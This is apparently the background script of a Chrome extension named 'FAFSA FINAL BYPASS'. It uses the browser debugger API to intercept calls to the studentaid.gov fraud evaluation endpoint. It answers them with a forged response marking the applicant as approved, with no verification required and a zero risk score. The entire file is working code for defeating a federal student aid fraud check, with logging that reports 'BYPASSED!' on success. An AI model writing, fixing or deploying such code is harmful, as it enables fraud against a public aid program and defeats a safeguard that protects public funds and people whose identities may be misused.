// FK LOCAL - FAFSA FINAL BYPASS (FIXED)
const PROTOCOL_VERSION = "1.3";
const attachedTabs = new Set();
const panelPorts = new Map();
let requestLog = [];

function log(msg) {
  const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
  requestLog.push(line);
  console.log(line);
  if (requestLog.length > 100) requestLog = requestLog.slice(-50);
}

// TARGET
const TARGET_URL = "user-api.studentaid.gov/fraud/evaluation";

// MOCK RESPONSE
const MOCK_RESPONSE = {
  status: 200,
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    isFraudVerificationRequired: false,
    status: "APPROVED",
    docVerificationStatus: "COMPLETE",
    evaluationId: "bypassed-local",
    riskScore: 0,
    passed: true,
    success: true
  })
};

// Check if URL is valid for debugging
function isValidUrl(url) {
  if (!url) return false;
  try {
    const u = new URL(url);
    // Block chrome internals
    if (u.protocol === 'chrome:' || u.protocol === 'chrome-extension:' ||
        u.protocol === 'about:' || u.protocol === 'edge:' ||
        u.protocol === 'file:' || u.protocol === 'devtools:') {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

chrome.runtime.onInstalled.addListener(async () => {
  await chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: true });
  await chrome.storage.local.set({ interceptionEnabled: true });
});

chrome.runtime.onConnect.addListener((port) => {
  if (!port.name.startsWith("fk-panel:")) return;
  const tabId = Number(port.name.split(":")[1]);
  if (!Number.isInteger(tabId)) return;

  panelPorts.set(tabId, port);
  port.onMessage.addListener((msg) => handleMessage(tabId, port, msg));
  port.onDisconnect.addListener(() => panelPorts.delete(tabId));
  
  // Get tab URL first
  chrome.tabs.get(tabId).then(tab => {
    if (isValidUrl(tab.url)) {
      armTab(tabId, port);
    } else {
      log(`Skipping invalid URL: ${tab?.url}`);
    }
  }).catch(() => {});
});

async function armTab(tabId, port) {
  // Double-check URL before attaching
  try {
    const tab = await chrome.tabs.get(tabId);
    if (!isValidUrl(tab.url)) {
      log(`Cannot arm: invalid URL ${tab.url}`);
      return false;
    }
  } catch {
    return false;
  }

  try {
    if (attachedTabs.has(tabId)) {
      await chrome.debugger.sendCommand({ tabId }, "Runtime.evaluate", { expression: "1" });
      if (port) port.postMessage({ type: "attached" });
      return true;
    }
    
    await chrome.debugger.attach({ tabId }, PROTOCOL_VERSION);
    await chrome.debugger.sendCommand({ tabId }, "Fetch.enable", {
      patterns: [{ urlPattern: "*", requestStage: "Request" }]
    });
    
    attachedTabs.add(tabId);
    log(`Armed tab ${tabId}`);
    if (port) port.postMessage({ type: "attached" });
    return true;
  } catch (e) {
    log(`Arm failed: ${e.message}`);
    return false;
  }
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && isValidUrl(tab.url)) {
    setTimeout(() => armTab(tabId, panelPorts.get(tabId)), 500);
  }
});

chrome.debugger.onEvent.addListener(async (source, method, params) => {
  if (method !== "Fetch.requestPaused" || !source.tabId) return;
  
  const { requestId, request, requestStage = "Request" } = params;
  const url = request.url || "";

  if (requestStage === "Response") {
    try { await chrome.debugger.sendCommand(source, "Fetch.continueResponse", { requestId }); } catch {}
    return;
  }

  // Check for target
  if (url.includes(TARGET_URL)) {
    log(`>>> BLOCKING: ${url.substring(0, 80)}`);
    
    try {
      await chrome.debugger.sendCommand(source, "Fetch.fulfillRequest", {
        requestId,
        responseCode: MOCK_RESPONSE.status,
        responseHeaders: Object.entries(MOCK_RESPONSE.headers).map(([n, v]) => ({ name: n, value: v })),
        body: btoa(unescape(encodeURIComponent(MOCK_RESPONSE.body)))
      });
      
      log(`>>> BYPASSED!`);
      
      for (const p of panelPorts.values()) {
        try { p.postMessage({ type: "bypass-success" }); } catch {}
      }
      return;
    } catch (e) {
      log(`Block failed: ${e.message}`);
    }
  }

  if (url.includes("studentaid.gov")) {
    log(`Request: ${url.substring(0, 60)}`);
  }

  try { await chrome.debugger.sendCommand(source, "Fetch.continueRequest", { requestId }); } catch {}
});

chrome.debugger.onDetach.addListener((source) => {
  if (source.tabId) attachedTabs.delete(source.tabId);
});

async function handleMessage(tabId, port, msg) {
  if (!msg?.type) return;

  switch (msg.type) {
    case "set-enabled":
      const enabled = Boolean(msg.enabled);
      await chrome.storage.local.set({ interceptionEnabled: enabled });
      if (!enabled) {
        for (const t of [...attachedTabs]) {
          try { await chrome.debugger.detach({ tabId: t }); } catch {}
          attachedTabs.delete(t);
        }
      } else {
        const tab = await chrome.tabs.get(tabId);
        if (isValidUrl(tab.url)) {
          await armTab(tabId, port);
        }
      }
      port.postMessage({ type: "state", attached: attachedTabs.has(tabId), enabled });
      break;

    case "get-state":
    case "heartbeat":
      const tab = await chrome.tabs.get(tabId).catch(() => null);
      if (tab && isValidUrl(tab.url)) {
        await armTab(tabId, port);
      }
      port.postMessage({ 
        type: "capture-stats", 
        stats: { total: requestLog.length, matched: requestLog.filter(l => l.includes("BLOCKING")).length }
      });
      port.postMessage({ type: "state", attached: attachedTabs.has(tabId), enabled: true });
      break;
  }
}

log("FAFSA bypass loaded - targeting: " + TARGET_URL);